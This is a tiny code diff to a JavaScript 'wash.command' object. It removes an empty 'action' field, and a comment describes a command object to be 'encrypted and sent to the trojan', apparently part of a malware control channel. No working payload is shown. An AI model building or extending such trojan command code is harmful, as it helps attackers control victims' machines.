@@ -1,7 +1,5 @@
 wash.command = {
-    // switch on wash actions
-    action: '',
-
+    
     // buffer the object that will be encrypted and sent to the trojan
     obj: new Command(),
 
